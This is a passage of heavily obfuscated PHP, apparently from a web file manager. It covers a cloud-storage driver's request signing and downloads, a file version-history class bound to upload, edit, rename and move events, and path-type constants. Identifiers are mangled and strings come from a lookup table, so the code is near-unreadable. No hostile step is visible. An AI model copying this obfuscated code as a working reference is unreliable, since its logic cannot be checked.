base64_encode(json_encode($²¿»º¥Ü)); $ˆ‚Ïä¨ = base64_encode(hash_hmac($Æßî–û…[1467], "\120\x4f\123\124\x26{$ËÀ¼ìç}\x26{$ ı×Àƒé}\x26{$¢ÃºûªĞ}", md5("{$this->userpass}"), !0)); $—±÷±Á = array($Æßî–û…[270] => $¢ÃºûªĞ, $Æßî–û…[1501] => "\125\120\131\125\116\x20{$this->username}\x3a{$ˆ‚Ïä¨}", $Æßî–û…[192] => $this->endpoint . $ËÀ¼ìç); return $—±÷±Á; } public function download($™Ñ¸², $ÊÙµÁÛ±) { $¤„Ø„üÀ = IO::getPathInner(IO::mkfile($ÊÙµÁÛ±)); if (!($“á·İ ˆ = $this->link($™Ñ¸²))) { return !1; } $Û¸¤ıèÜ = 0; $®ƒÆÑ÷ = 1024 * 200; $Çêû÷Ìç = fopen($¤„Ø„üÀ, $_SERVER[¹òÍ›æş][1451]); while (!0) { $¹´Ì í = $this->fileSubstr($™Ñ¸², $Û¸¤ıèÜ, $®ƒÆÑ÷); if ($¹´Ì í === !1) { return !1; } fwrite($Çêû÷Ìç, $¹´Ì í); $Û¸¤ıèÜ += $®ƒÆÑ÷; if (strlen($¹´Ì í) < $®ƒÆÑ÷) { break; } } fclose($Çêû÷Ìç); return $ÊÙµÁÛ±; } public function link($Ü”º¹ , $³é¸Ú®© = array()) { $èí ˜ú† =& $_SERVER[¹òÍ›æş]; $Ü”º¹  = trim($Ü”º¹ , $èí ˜ú†[8]); if (!empty($this->token)) { $ô«æÄ = strtotime(date($èí ˜ú†[1502])); $²Ëµ¼–ã = substr(md5($this->token . $èí ˜ú†[322] . $ô«æÄ . $èí ˜ú†[1503] . $Ü”º¹ ), 12, 8) . $ô«æÄ; $³é¸Ú®©[] = $èí ˜ú†[1504] . $²Ëµ¼–ã; } $êìÁõæ© = !empty($³é¸Ú®©) ? $èí ˜ú†[83] . implode($èí ˜ú†[322], $³é¸Ú®©) : $èí ˜ú†[12]; return $this->getHost() . $èí ˜ú†[8] . $Ü”º¹  . $êìÁõæ©; } public function fileOut($‰ß÷ÚøÊ, $ó—°Øœ = false, $Ëë÷’³ä = false, $–—·öÎÚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($‰ß÷ÚøÊ, $ó—°Øœ, $Ëë÷’³ä, $–—·öÎÚ); } if (!$Ëë÷’³ä) { $Ëë÷’³ä = $this->pathThis($‰ß÷ÚøÊ); } $³šà†Ÿª = $ó—°Øœ ? array($_SERVER[¹òÍ›æş][1505] . rawurlencode($Ëë÷’³ä)) : array(); $ÜóòÊ¸ş = $this->link($‰ß÷ÚøÊ, $³šà†Ÿª); $this->fileOutLink($ÜóòÊ¸ş); } public function fileOutServer($û©Å Ì¹, $öØĞğü = false, $Ğà“çŒß = false, $Äğà«½ó = '') { parent::fileOut($û©Å Ì¹, $öØĞğü, $Ğà“çŒß, $Äğà«½ó); } public function fileOutImage($´¥ÇŸ“ø, $Ïç°î = 250) { $æëë–Æ× = $this->link($´¥ÇŸ“ø . $_SERVER[¹òÍ›æş][1506] . $Ïç°î); $this->fileOutLink($æëë–Æ×); } public function fileOutImageServer($šµ¡Á£, $ÀğºıÑ‹ = 250) { parent::fileOutImage($šµ¡Á£, $ÀğºıÑ‹); } public function hashMd5($¥æ°ı…Á) { $Æ½÷½› =& $_SERVER[¹òÍ›æş]; $Ó‚´ô÷× = $this->_objectMeta($¥æ°ı…Á); return isset($Ó‚´ô÷×[$Æ½÷½›[222]]) ? $Ó‚´ô÷×[$Æ½÷½›[222]] : !1; } public function size($õºÀ«Åû) { $¡çÇ‰Û† = $this->objectMeta($õºÀ«Åû); return $¡çÇ‰Û† ? $¡çÇ‰Û†[$_SERVER[¹òÍ›æş][86]] : 0; } public function info($Úù„ø) { if ($this->isFolder($Úù„ø)) { return $this->folderInfo($Úù„ø); } else { if ($this->isFile($Úù„ø)) { return $this->fileInfo($Úù„ø); } } return !1; } public function exist($‘ó‹ÕÙ¾) { return $this->isFile($‘ó‹ÕÙ¾) || $this->isFolder($‘ó‹ÕÙ¾); } public function isFile($Ãá¡¢…å) { return !$this->isFolder($Ãá¡¢…å) && $this->objectMeta($Ãá¡¢…å); } public function isFolder($ğé¶±â‘) { return $this->cacheMethod($_SERVER[¹òÍ›æş][175], $ğé¶±â‘); } protected function objectMeta($ğö”ü½Û) { return $this->cacheMethod($_SERVER[¹òÍ›æş][177], $ğö”ü½Û); } protected function _objectMeta($à‡Şøçî) { $ƒ¶–úá¹ =& $_SERVER[¹òÍ›æş]; if ($à‡Şøçî == $ƒ¶–úá¹[12] || $à‡Şøçî == $ƒ¶–úá¹[8]) { return array(); } $ÛÇ¾ßÌÕ = $this->ussRequest($à‡Şøçî, $ƒ¶–úá¹[1507]); if (!$ÛÇ¾ßÌÕ[$ƒ¶–úá¹[1239]]) { return null; } $Š¥ìÚ¨ = isset($ÛÇ¾ßÌÕ[$ƒ¶–úá¹[1229]]) ? $ÛÇ¾ßÌÕ[$ƒ¶–úá¹[1229]] : array(); if (!isset($Š¥ìÚ¨[$ƒ¶–úá¹[1508]])) { return null; } $•†Îîœˆ = array($ƒ¶–úá¹[33] => isset($Š¥ìÚ¨[$ƒ¶–úá¹[1508]]) ? $Š¥ìÚ¨[$ƒ¶–úá¹[1508]] : null, $ƒ¶–úá¹[86] => isset($Š¥ìÚ¨[$ƒ¶–úá¹[1509]]) ? $Š¥ìÚ¨[$ƒ¶–úá¹[1509]] : null, $ƒ¶–úá¹[222] => isset($Š¥ìÚ¨[$ƒ¶–úá¹[1510]]) ? $Š¥ìÚ¨[$ƒ¶–úá¹[1510]] : null, $ƒ¶–úá¹[1477] => isset($Š¥ìÚ¨[$ƒ¶–úá¹[1511]]) ? $Š¥ìÚ¨[$ƒ¶–úá¹[1511]] : null); $•†Îîœˆ[$ƒ¶–úá¹[1478]] = isset($Š¥ìÚ¨[$ƒ¶–úá¹[1512]]) ? strtotime($Š¥ìÚ¨[$ƒ¶–úá¹[1512]]) : $•†Îîœˆ[$ƒ¶–úá¹[1477]]; return $•†Îîœˆ; } protected function _isFolder($Ï¼Öå¼³) { $®êÖŒëå =& $_SERVER[¹òÍ›æş]; if ($Ï¼Öå¼³ == $®êÖŒëå[12] || $Ï¼Öå¼³ == $®êÖŒëå[8]) { return !0; } $•¨÷Ú¨ä = $this->_objectMeta($Ï¼Öå¼³); return isset($•¨÷Ú¨ä[$®êÖŒëå[33]]) && $•¨÷Ú¨ä[$®êÖŒëå[33]] == $®êÖŒëå[85] ? !0 : !1; } } goto EÓĞ¥·†Ò; e¢®²È…ª: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $²â¢—¼Ø =& $_SERVER[¹òÍ›æş]; $Œ÷„òÅ = $GLOBALS[$²â¢—¼Ø[6]][$²â¢—¼Ø[99]]; if ($Œ÷„òÅ[$²â¢—¼Ø[1243]] != 1) { return; } if ($Œ÷„òÅ[$²â¢—¼Ø[1244]] <= 0) { return; } if (isset($_REQUEST[$²â¢—¼Ø[1245]]) && $_REQUEST[$²â¢—¼Ø[1245]] == $²â¢—¼Ø[98]) { return; } Hook::bind($²â¢—¼Ø[1246], $²â¢—¼Ø[1247]); Hook::bind($²â¢—¼Ø[1248], $²â¢—¼Ø[1249]); Hook::bind($²â¢—¼Ø[1250], $²â¢—¼Ø[1251]); Hook::bind($²â¢—¼Ø[1252], $²â¢—¼Ø[1253]); Hook::bind($²â¢—¼Ø[1254], $²â¢—¼Ø[1255]); Hook::bind($²â¢—¼Ø[1256], $²â¢—¼Ø[1257]); } public static function eventBeforeUpload($Ü‘¿Ğâ) { if ($Ü‘¿Ğâ[3] && $Ü‘¿Ğâ[3] != REPEAT_REPLACE) { return; } $äš¥ôƒ = self::parsePath($Ü‘¿Ğâ[0]); if (!$äš¥ôƒ) { return; } self::add($äš¥ôƒ); } public static function eventBeforeEdit($’ˆÖ”íŒ) { $íˆÚğîİ = self::parsePath($’ˆÖ”íŒ[0]); if (!$íˆÚğîİ) { return; } self::add($íˆÚğîİ); } public static function eventBeforeCopyFile($§Î®Ì§£, $ Å•öÕ, $°àåí—, $Ò¢ß¨è, $ïƒÂ¾—•, $ÚñÚû»…) { $ÍŒ§’‚Œ =& $_SERVER[¹òÍ›æş]; if (isset($°àåí—->_data[$ÍŒ§’‚Œ[1182]]) && $°àåí—->_data[$ÍŒ§’‚Œ[1182]]) { return; } $ë‘ä‰ùÖ = $°àåí—->getPathOuter($Ò¢ß¨è); $îç†¶¯¹ = self::parsePath($ë‘ä‰ùÖ); if (!$îç†¶¯¹) { return; } self::add($îç†¶¯¹); } public static function eventBeforeRename($§•ääá) { $ıçÔ¨Ê =& $_SERVER[¹òÍ›æş]; $„øÆ˜àÃ = self::parsePath($§•ääá[0]); if (!$„øÆ˜àÃ) { return; } $ô¼™µ¬ = self::checkInHistory($„øÆ˜àÃ); if (!$ô¼™µ¬) { return; } if ($ô¼™µ¬[$ıçÔ¨Ê[33]] == $ıçÔ¨Ê[210]) { $Ü‘”†š½ = self::listData($„øÆ˜àÃ); if ($Ü‘”†š½ && $Ü‘”†š½[$ıçÔ¨Ê[407]]) { self::moveHistory($„øÆ˜àÃ, $§•ääá[1]); } } else { IO::rename($ô¼™µ¬[$ıçÔ¨Ê[94]], $§•ääá[1]); } } public static function eventBeforeMove($¯ˆÍ™Ãï) { $§­Üˆú =& $_SERVER[¹òÍ›æş]; $›õáşİ = self::parsePath($¯ˆÍ™Ãï[0]); if (!$›õáşİ) { return; } $Ö ‡Ôí¹ = self::parsePath($¯ˆÍ™Ãï[1]); if (!$Ö ‡Ôí¹) { return; } $«£çÔóï = $¯ˆÍ™Ãï[3]; $—äáŞ = self::checkInHistory($›õáşİ); if (!$—äáŞ) { return; } $•›Ô¥è = self::pathHistory($Ö ‡Ôí¹); if ($—äáŞ[$§­Üˆú[33]] == $§­Üˆú[210]) { $×³µò = self::listData($›õáşİ); $İÙà¨†¯ = rtrim($Ö ‡Ôí¹, $§­Üˆú[8]) . $§­Üˆú[8] . ($«£çÔóï ? $«£çÔóï : get_path_this($›õáşİ)); $†ãª˜—Æ = self::listData($İÙà¨†¯); if ($×³µò && $×³µò[$§­Üˆú[407]] && $†ãª˜—Æ && $†ãª˜—Æ[$§­Üˆú[407]]) { return self::clear($›õáşİ); } if ($×³µò && $×³µò[$§­Üˆú[407]]) { self::moveHistory($›õáşİ, $«£çÔóï, $•›Ô¥è); } } else { IO::move($—äáŞ[$§­Üˆú[94]], $•›Ô¥è, !1, $«£çÔóï); self::clearEmptyFolder(IO::pathFather($—äáŞ[$§­Üˆú[94]])); } } public static function eventAfterRemove($¼¥òĞÅ, $ÊÓ÷üà) { $Ñ®¯Ò =& $_SERVER[¹òÍ›æş]; if (!$ÊÓ÷üà) { return; } $À×û¾·š = self::parsePath($¼¥òĞÅ[0]); if (!$À×û¾·š) { return; } $•şª‰ù = self::checkInHistory($À×û¾·š); if (!$•şª‰ù) { return; } if ($•şª‰ù[$Ñ®¯Ò[33]] == $Ñ®¯Ò[210]) { $áÓÇùø® = self::listData($À×û¾·š, !1); if ($áÓÇùø® && $áÓÇùø®[$Ñ®¯Ò[407]]) { self::clear($À×û¾·š, !1); } } else { IO::remove($•şª‰ù[$Ñ®¯Ò[94]]); self::clearEmptyFolder(IO::pathFather($•şª‰ù[$Ñ®¯Ò[94]])); } } private static function checkInHistory($º³Æ¢) { $›‘·Ë’à = self::pathHistory($º³Æ¢); if (!IO::exist($›‘·Ë’à)) { $›‘·Ë’à .= $_SERVER[¹òÍ›æş][1258]; } return IO::exist($›‘·Ë’à) ? IO::info($›‘·Ë’à) : !1; } private static function parsePath($ã®³ğÀğ) { $¾ã·ˆ› =& $_SERVER[¹òÍ›æş]; if (!$ã®³ğÀğ) { return !1; } if ($GLOBALS[$¾ã·ˆ›[1259]]) { return; } $¼¸µ™„Ö = KodIO::parse($ã®³ğÀğ); $Î…úæÒ½ = $¼¸µ™„Ö[$¾ã·ˆ›[33]]; $ç½‡¼ñö = !$Î…úæÒ½ || $Î…úæÒ½ == KodIO::KOD_IO || $Î…úæÒ½ == KodIO::KOD_SHARE_ITEM; if (!$ç½‡¼ñö || !$¼¸µ™„Ö[$¾ã·ˆ›[1260]]) { return !1; } if (substr($ã®³ğÀğ, 0, strlen(DATA_PATH . $¾ã·ˆ›[1261])) == DATA_PATH . $¾ã·ˆ›[1261]) { return !1; } if ($Î…úæÒ½ == KodIO::KOD_SHARE_ITEM) { $Ü®‡—•£ = IO::init($ã®³ğÀğ); if ($Ü®‡—•£->pathParse[$¾ã·ˆ›[1178]]) { return self::parsePath($Ü®‡—•£->pathParse[$¾ã·ˆ›[1178]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $šâ…á±® = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¾ã·ˆ›[1262]); foreach ($šâ…á±® as $®ãğ¡¨ç) { if (!$Î…úæÒ½ && substr($ã®³ğÀğ, 0, strlen($®ãğ¡¨ç)) == $®ãğ¡¨ç) { return !1; } } self::log($GLOBALS[$¾ã·ˆ›[1173]] . $¾ã·ˆ›[1263] . $ã®³ğÀğ); return $ã®³ğÀğ; } private static function pathHistory($†ßù±À“) { $çöòú¯‚ =& $_SERVER[¹òÍ›æş]; $ñ—¹ñúù = self::$_historyBase . ltrim(KodIO::clear($†ßù±À“), $çöòú¯‚[8]); $ñ—¹ñúù = str_replace(array($çöòú¯‚[1264]), array($çöòú¯‚[1265]), $ñ—¹ñúù); return $ñ—¹ñúù; } public static function log($°“ª«ŠÇ) { } public static function historyCount($„ïÏ¤¶Ó) { $¾ì¥£ê› =& $_SERVER[¹òÍ›æş]; $‘£„È©¡ = array(); $Á­¹íëÂ = array(); foreach ($„ïÏ¤¶Ó as $ÛÂ¼´ó) { $ÆĞÎÓş = get_path_father($ÛÂ¼´ó); if (!$Á­¹íëÂ[$ÆĞÎÓş]) { $Á­¹íëÂ[$ÆĞÎÓş] = array(); } $Á­¹íëÂ[$ÆĞÎÓş][] = get_path_this($ÛÂ¼´ó); } foreach ($Á­¹íëÂ as $ÆĞÎÓş => $ß‰›øŞÇ) { $œÙ­Àâ¢ = self::parsePath($ÆĞÎÓş); if (!$œÙ­Àâ¢) { continue; } foreach ($ß‰›øŞÇ as $š½óé­Ä) { $Å½áÒˆ± = self::listData(rtrim($œÙ­Àâ¢, $¾ì¥£ê›[8]) . $¾ì¥£ê›[8] . $š½óé­Ä, !1); if ($Å½áÒˆ± && $Å½áÒˆ±[$¾ì¥£ê›[407]]) { $‘£„È©¡[rtrim($ÆĞÎÓş, $¾ì¥£ê›[8]) . $¾ì¥£ê›[8] . $š½óé­Ä] = count($Å½áÒˆ±[$¾ì¥£ê›[407]]); } } } return $‘£„È©¡; } public static function add($ïÅÊëÊ) { $´²†Á¯ñ =& $_SERVER[¹òÍ›æş]; $¾ĞŞÎŸÉ = self::listData($ïÅÊëÊ); if (!$¾ĞŞÎŸÉ) { return; } $™¤ğôË = Model($´²†Á¯ñ[800])->get($´²†Á¯ñ[1266]); $ÛÓÆœŒ = $GLOBALS[$´²†Á¯ñ[6]][$´²†Á¯ñ[99]][$´²†Á¯ñ[1244]]; $á˜Ñ£°£ = $™¤ğôË == $´²†Á¯ñ[1267] ? min(5, $ÛÓÆœŒ) : $ÛÓÆœŒ; if ($ÛÓÆœŒ <= 0) { return; } $óà¨ÂÁš = IO::info($ïÅÊëÊ); $‰¼–ıµİ = $¾ĞŞÎŸÉ[$´²†Á¯ñ[407]]; if ($óà¨ÂÁš[$´²†Á¯ñ[86]] == 0) { return; } if ($óà¨ÂÁš[$´²†Á¯ñ[86]] >= 1024 * 1024 * 500) { return !1; } $ç•ã¤·â = IO::hashSimple($ïÅÊëÊ); if ($‰¼–ıµİ && $‰¼–ıµİ[0][$´²†Á¯ñ[187]] == $ç•ã¤·â) { return !0; } if (array_key_exists($´²†Á¯ñ[213], $óà¨ÂÁš) && !$óà¨ÂÁš[$´²†Á¯ñ[213]]) { return !1; } $¶¶¶œËË = short_id(time()); $’…ø‰¦‹ = array($´²†Á¯ñ[437] => $¶¶¶œËË, $´²†Á¯ñ[187] => $ç•ã¤·â, $´²†Á¯ñ[32] => $óà¨ÂÁš[$´²†Á¯ñ[32]] . $´²†Á¯ñ[10] . date($´²†Á¯ñ[1268]) . rand_string(1), $´²†Á¯ñ[86] => $óà¨ÂÁš[$´²†Á¯ñ[86]], $´²†Á¯ñ[492] => USER_ID, $´²†Á¯ñ[211] => time(), $´²†Á¯ñ[1269] => $´²†Á¯ñ[12]); IO::mkdir($¾ĞŞÎŸÉ[$´²†Á¯ñ[1270]]); $Êúğ±Úğ = IO::copy($ïÅÊëÊ, $¾ĞŞÎŸÉ[$´²†Á¯ñ[1270]], !1, $’…ø‰¦‹[$´²†Á¯ñ[32]]); if (!$Êúğ±Úğ) { self::clearEmptyFolder($¾ĞŞÎŸÉ[$´²†Á¯ñ[1270]]); return !1; } array_unshift($‰¼–ıµİ, $’…ø‰¦‹); if (count($‰¼–ıµİ) > $á˜Ñ£°£) { $‹×‘²ş = array_slice($‰¼–ıµİ, $á˜Ñ£°£); foreach ($‹×‘²ş as $ÜÚ§òì‰) { IO::remove($¾ĞŞÎŸÉ[$´²†Á¯ñ[1270]] . $ÜÚ§òì‰[$´²†Á¯ñ[32]]); } $‰¼–ıµİ = array_slice($‰¼–ıµİ, 0, $á˜Ñ£°£); } return self::saveData($¾ĞŞÎŸÉ[$´²†Á¯ñ[1271]], $‰¼–ıµİ); } public static function remove($ÀÁ¥‘Ãœ, $öËşÉÏ“) { $ÉŞîŞÅä =& $_SERVER[¹òÍ›æş]; $ÜĞê™¸† = self::listData($ÀÁ¥‘Ãœ); $ü†™‘ÎÇ = array(); if (!$ÜĞê™¸†) { return !1; } foreach ($ÜĞê™¸†[$ÉŞîŞÅä[407]] as $Üæ˜É¶) { if ($Üæ˜É¶[$ÉŞîŞÅä[437]] == $öËşÉÏ“) { IO::remove($ÜĞê™¸†[$ÉŞîŞÅä[1270]] . $Üæ˜É¶[$ÉŞîŞÅä[32]]); continue; } $ü†™‘ÎÇ[] = $Üæ˜É¶; } return self::saveData($ÜĞê™¸†[$ÉŞîŞÅä[1271]], $ü†™‘ÎÇ); } public static function clear($Ş¾²ÏõŸ, $ü­”ğ…Ç = true) { $¥ı¿—Ô– =& $_SERVER[¹òÍ›æş]; $º¼ß€ÖÁ = self::listData($Ş¾²ÏõŸ, $ü­”ğ…Ç); if (!$º¼ß€ÖÁ) { return !1; } foreach ($º¼ß€ÖÁ[$¥ı¿—Ô–[407]] as $’èüş¢Ó) { IO::remove($º¼ß€ÖÁ[$¥ı¿—Ô–[1270]] . $’èüş¢Ó[$¥ı¿—Ô–[32]]); } return self::saveData($º¼ß€ÖÁ[$¥ı¿—Ô–[1271]], array()); } public static function moveHistory($éûéãßÚ, $£®Ù‘å… = '', $ÙŠ§²»¡ = '') { $ßŸ¨œÊŒ =& $_SERVER[¹òÍ›æş]; $°¯ú’·§ = self::listData($éûéãßÚ, !1); if (!$°¯ú’·§ || !$°¯ú’·§[$ßŸ¨œÊŒ[407]]) { return !1; } $ÆšµÈ¯ı = $ßŸ¨œÊŒ[1258]; $£®Ù‘å… = $£®Ù‘å… ? $£®Ù‘å… : get_path_this($éûéãßÚ); $ÙŠ§²»¡ = $ÙŠ§²»¡ ? $ÙŠ§²»¡ : $°¯ú’·§[$ßŸ¨œÊŒ[1270]]; $ŞáíÂÁ = substr(get_path_this($°¯ú’·§[$ßŸ¨œÊŒ[1271]]), 0, -strlen($ÆšµÈ¯ı)); foreach ($°¯ú’·§[$ßŸ¨œÊŒ[407]] as $îîŞá§š => $âßÜ˜®œ) { $›¤ÌÍ–¹ = $£®Ù‘å… . substr($âßÜ˜®œ[$ßŸ¨œÊŒ[32]], strlen($ŞáíÂÁ)); $’ùŞœµ = IO::move($°¯ú’·§[$ßŸ¨œÊŒ[1270]] . $âßÜ˜®œ[$ßŸ¨œÊŒ[32]], $ÙŠ§²»¡, !1, $›¤ÌÍ–¹); if ($’ùŞœµ) { $°¯ú’·§[$ßŸ¨œÊŒ[407]][$îîŞá§š][$ßŸ¨œÊŒ[32]] = $›¤ÌÍ–¹; } } $°¯ú’·§[$ßŸ¨œÊŒ[1271]] = IO::move($°¯ú’·§[$ßŸ¨œÊŒ[1271]], $ÙŠ§²»¡, !1, $£®Ù‘å… . $ÆšµÈ¯ı); self::saveData($°¯ú’·§[$ßŸ¨œÊŒ[1271]], $°¯ú’·§[$ßŸ¨œÊŒ[407]]); self::clearEmptyFolder($°¯ú’·§[$ßŸ¨œÊŒ[1270]]); } public static function rollback($Ñ‘×ì’´, $à¨äœ‰) { $îöÂ£ÓØ =& $_SERVER[¹òÍ›æş]; $ıïİºë… = self::listData($Ñ‘×ì’´); if (!$ıïİºë…) { return; } $´Â„í´¹ = IO::info($Ñ‘×ì’´); foreach ($ıïİºë…[$îöÂ£ÓØ[407]] as $Æ‚¸ñÉ¤ => $°»¢ñ¤Ü) { if ($°»¢ñ¤Ü[$îöÂ£ÓØ[437]] == $à¨äœ‰) { self::add($Ñ‘×ì’´); $·¤ÆöÆ = $ıïİºë…[$îöÂ£ÓØ[1270]] . $°»¢ñ¤Ü[$îöÂ£ÓØ[32]]; $Üúœíø = IO::copy($·¤ÆöÆ, IO::pathFather($Ñ‘×ì’´), REPEAT_REPLACE, $´Â„í´¹[$îöÂ£ÓØ[32]]); if ($Üúœíø) { self::remove($Ñ‘×ì’´, $à¨äœ‰); } return $Üúœíø; } } return !1; } public static function setDetail($â¤‡ãÅ, $ÕÃÄ¥ÈÆ, $ùÚ²½ğÅ) { $˜ ’ï¥é =& $_SERVER[¹òÍ›æş]; $µìŠÛœœ = self::listData($â¤‡ãÅ); if (!$µìŠÛœœ) { return; } foreach ($µìŠÛœœ[$˜ ’ï¥é[407]] as $€™ˆ‹¡Ä => $®­ãµÙ) { if ($®­ãµÙ[$˜ ’ï¥é[437]] == $ÕÃÄ¥ÈÆ) { $µìŠÛœœ[$˜ ’ï¥é[407]][$€™ˆ‹¡Ä][$˜ ’ï¥é[1269]] = $ùÚ²½ğÅ; self::saveData($µìŠÛœœ[$˜ ’ï¥é[1271]], $µìŠÛœœ[$˜ ’ï¥é[407]]); return !0; } } return !1; } public static function fileInfo($ÅˆÈí¸˜, $¸µó²Ğ¡) { $ÖÄÊ‰• =& $_SERVER[¹òÍ›æş]; $©É¿ö²” = self::listData($ÅˆÈí¸˜); if (!$©É¿ö²”) { show_json(LNG($ÖÄÊ‰•[115]), !1); } $ëŒ×ğÖ = $ÖÄÊ‰•[12]; foreach ($©É¿ö²”[$ÖÄÊ‰•[407]] as $Å„·›‘® => $®²šøé) { if ($®²šøé[$ÖÄÊ‰•[437]] != $¸µó²Ğ¡) { continue; } $ëŒ×ğÖ = $©É¿ö²”[$ÖÄÊ‰•[1270]] . $®²šøé[$ÖÄÊ‰•[32]]; break; } if (!$ëŒ×ğÖ) { show_json(LNG($ÖÄÊ‰•[115]), !1); } return IO::info($ëŒ×ğÖ); } public static function fileOut($óıœ°‚ª, $Ğï¥êÎ¨, $˜ËƒùÅÊ = false) { $ª‡Ìº¿ö =& $_SERVER[¹òÍ›æş]; $şÑ¹Ÿ = self::fileInfo($óıœ°‚ª, $Ğï¥êÎ¨); $ëŠ¤ŠÒÛ =& $GLOBALS[$ª‡Ìº¿ö[7]]; $˜ËƒùÅÊ = isset($ëŠ¤ŠÒÛ[$ª‡Ìº¿ö[1221]]) && $ëŠ¤ŠÒÛ[$ª‡Ìº¿ö[1221]] == 1; if (isset($ëŠ¤ŠÒÛ[$ª‡Ìº¿ö[33]]) && $ëŠ¤ŠÒÛ[$ª‡Ìº¿ö[33]] == $ª‡Ìº¿ö[1272]) { return IO::fileOutImage($şÑ¹Ÿ[$ª‡Ìº¿ö[94]], $ëŠ¤ŠÒÛ[$ª‡Ìº¿ö[1273]]); } IO::fileOut($şÑ¹Ÿ[$ª‡Ìº¿ö[94]], $˜ËƒùÅÊ, get_path_this($óıœ°‚ª)); } public static function listData($¸Œº×Çæ, $±Êç·ñ = true) { $— ¨òµá =& $_SERVER[¹òÍ›æş]; if ($±Êç·ñ && !IO::exist($¸Œº×Çæ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¸Œº×Çæ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $âßĞ² = self::pathHistory($¸Œº×Çæ); $µØŸ–š³ = array($— ¨òµá[1271] => $âßĞ² . $— ¨òµá[1258], $— ¨òµá[1270] => rtrim(get_path_father($âßĞ²), $— ¨òµá[8]) . $— ¨òµá[8], $— ¨òµá[407] => array()); $Öšú™‘ = IO::getContent($µØŸ–š³[$— ¨òµá[1271]]); if ($Öšú™‘) { $ƒ¼¤ÍÑœ = json_decode($Öšú™‘, !0); if (is_array($ƒ¼¤ÍÑœ)) { $µØŸ–š³[$— ¨òµá[407]] = $ƒ¼¤ÍÑœ; } } return $µØŸ–š³; } private static function saveData($±€šÈ–, $¬Çè›†›) { $½ÏÁ¯Å¾ =& $_SERVER[¹òÍ›æş]; self::log($½ÏÁ¯Å¾[1274] . $±€šÈ– . $½ÏÁ¯Å¾[81] . count($¬Çè›†›), $½ÏÁ¯Å¾[781]); if ($¬Çè›†›) { return IO::setContent($±€šÈ–, json_encode($¬Çè›†›)); } $¹»æÅ‰º = IO::pathFather($±€šÈ–); IO::remove($±€šÈ–); self::clearEmptyFolder($¹»æÅ‰º); return !0; } public static function clearEmptyFolder($ğíòË«º) { $‚àß–òÂ =& $_SERVER[¹òÍ›æş]; if (trim($ğíòË«º, $‚àß–òÂ[8]) == trim(self::$_historyBase, $‚àß–òÂ[8])) { return; } $·İñ‡Ö² = IO::pathFather($ğíòË«º); $œÉıÏÎÂ = IO::has($ğíòË«º, !0); if ($œÉıÏÎÂ[$‚àß–òÂ[217]] > 0 || $œÉıÏÎÂ[$‚àß–òÂ[218]] > 0) { return; } IO::remove($ğíòË«º); self::clearEmptyFolder($·İñ‡Ö²); } private static function getBasePath() { $¤Ú¨èÈè =& $_SERVER[¹òÍ›æş]; $Ôçª¾’¿ = Model($¤Ú¨èÈè[1275])->get($¤Ú¨èÈè[1276]); if ($Ôçª¾’¿) { if (!IO::exist($Ôçª¾’¿)) { IO::mkdir($Ôçª¾’¿); } if (get_path_this($Ôçª¾’¿) == $¤Ú¨èÈè[1261]) { $ŞŸØıÍô = $¤Ú¨èÈè[1277] . rand_string(8); @rename($Ôçª¾’¿, get_path_father($Ôçª¾’¿) . $¤Ú¨èÈè[8] . $ŞŸØıÍô); $Ôçª¾’¿ = DATA_PATH . $ŞŸØıÍô . $¤Ú¨èÈè[8]; file_put_contents(DATA_PATH . $¤Ú¨èÈè[1211], $¤Ú¨èÈè[12]); Model($¤Ú¨èÈè[1275])->set($¤Ú¨èÈè[1276], $Ôçª¾’¿); } return $Ôçª¾’¿; } $Ôçª¾’¿ = DATA_PATH . $¤Ú¨èÈè[1277] . rand_string(8) . $¤Ú¨èÈè[8]; $Ôçª¾’¿ = IO::mkdir($Ôçª¾’¿); $Ôçª¾’¿ = rtrim($Ôçª¾’¿, $¤Ú¨èÈè[8]) . $¤Ú¨èÈè[8]; file_put_contents($Ôçª¾’¿ . $¤Ú¨èÈè[1211], $¤Ú¨èÈè[12]); file_put_contents(DATA_PATH . $¤Ú¨èÈè[1211], $¤Ú¨èÈè[12]); Model($¤Ú¨èÈè[1275])->set($¤Ú¨èÈè[1276], $Ôçª¾’¿); return $Ôçª¾’¿; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\x65\162\x52\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\151\x6c\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\151\154\x65\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\165\160\122\157\x6f\x74\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\x75\x73\145\162\123\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\123\150\x61\x72\145\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\162\x65\x54\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\x65\x49\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\141\x72\x65\x49\x74\x65\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\173\163\x65\141\x72\143\x68\175"; const KOD_BLOCK = "\173\x62\154\157\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\145\x72\122\x65\x6e\143\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\145\162\175"; public static function typeList() { $’­ˆåš =& $_SERVER[¹òÍ›æş]; return array($’­ˆåš[1278] => self::KOD_SOURCE, $’­ˆåš[1279] => self::KOD_USER_RECYCLE, $’­ˆåš[1280] => self::KOD_USER_FAV, $’­ˆåš[1281] => self::KOD_USER_FILE_TAG, $’­ˆåš[1282] => self::KOD_USER_FILE_TYPE, $’­ˆåš[1283] => self::KOD_GROUP_ROOT_SELF, $’­ˆåš[1284] => self::KOD_USER_SHARE, $’­ˆåš[1285] => self::KOD_USER_SHARE_LINK, $’­ˆåš[1286] => self::KOD_USER_SHARE_TO_ME, $’­ˆåš[1287] => self::KOD_SHARE_ITEM, 